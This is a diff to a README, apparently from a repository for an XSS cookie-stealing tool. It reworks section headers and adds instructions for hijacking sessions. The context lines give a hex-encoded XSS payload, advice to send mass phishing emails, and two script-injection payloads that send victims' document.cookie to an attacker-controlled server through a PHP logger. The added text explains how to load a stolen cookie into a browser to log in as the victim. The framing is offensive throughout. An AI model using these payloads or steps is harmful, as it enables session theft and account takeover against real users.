@@ -68,7 +68,7 @@ would instead look like this
 http://www.site.com/search.php?q=22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%68%61%78%6f%72%7a%22%29%3c%2f%73%63%72%69%70%74%3e
 ```
 This is the oldest trick in the book and is still pretty common, so if you ever recieve a link from ANYONE with a hexadecimal search query, I always recommend dropping it into a hex/ascii converter so you can inspect it just to be safe (Even if it's a website you trust).  Now simply send a million emails pretending to be someone's grandma asking how to buy a birthday present online and start stealing cookies!
-## Cookie stealin
+### Cookie stealin
 The next part of stealing cookies requires a bit more work.  First you'll need a PHP script (like the one in this repo).  Then make a file called `log.txt`.  You'll need to store the php and log files on a server (I'm not going to walk you though that part, everyone and their mom has their own server.  Ask google if you need help).  I use a Raspberry Pi for this purpose.  Your XSS injection should look something like this:
 ```HTML
 "><script language= "JavaScript">document.location="http://yourServerIpOrDomainName.com/nameOfYourPhpScript.php?cookie=" + document.cookie;document.location="http://www.pageYouWantToExploit.com"</script>
@@ -78,5 +78,7 @@ This should log the cookie and then redirect the user back to the source page bu
 "><a href="#" onclick="document.location='http://yourServerIpOrDomainName.com/yourServerIpOrDomainName.php?cookie=' +escape(document.cookie);"><Click here if you are not automatically redirected></a></script>
 ```
 The resulting log file should look something like the one in this repo.
-## What do I do with this cookie
-Coming soon
+### What do I do with this cookie
+Sometimes (on poorly made websites) your session id will be displayed in plaintext in the URL.  If that's the case, then accessing somebody else's session is as easy as replacing yours with theirs.  If that's not the case, then you could use a tool like Firebug to edit your cookie.
+https://getfirebug.com/
+Add or modify all your cookie's fields to match the data from the cookie in your log file and refresh the page.  Now you're logged in as your victim!  Hooray!
